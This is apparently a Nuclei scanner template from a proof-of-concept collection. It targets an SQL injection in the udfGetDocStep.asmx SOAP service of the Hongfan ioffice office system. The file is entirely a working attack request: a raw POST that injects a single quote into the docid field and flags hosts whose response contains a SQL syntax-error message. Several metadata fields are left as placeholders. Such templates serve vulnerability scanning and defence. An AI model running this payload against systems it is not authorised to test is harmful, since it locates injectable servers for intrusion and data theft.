pocs/nuclei/hfoffice-udfGetDocStep-sqli.yaml

id: hfoffice-udfGetDocStep-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 红帆ioffice-udfGetDocStep.asmx存在SQL注入漏洞
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |+
        POST //ioffice/prg/interface/udfGetDocStep.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetDocStep"
        Content-Length: 358

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Body>
            <GetDocStep xmlns="http://tempuri.org/">
                <docid>1'</docid>
            </GetDocStep>
            </soap:Body>
        </soap:Envelope>

    matchers:
      - type: word
        part: body
        words:
          - '附近有语法错误'
